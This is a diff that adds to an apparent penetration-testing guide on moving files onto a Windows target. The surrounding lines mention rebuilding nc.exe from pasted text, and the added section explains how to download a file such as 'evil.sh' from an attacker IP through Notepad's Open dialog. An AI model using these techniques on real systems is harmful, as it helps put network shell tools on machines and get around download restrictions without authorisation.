@@ -158,3 +158,15 @@ wine exe2bat.exe nc.exe nc.txt
 
 Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
 
+
+
+### If you a GUI but are limited
+
+download files via notepad: 
+
+```
+from notepad click file->"Open" in the "File name:" field type the path to your file (ex. http://10.10.10.1/evil.sh) and click Open.
+```
+
+
+
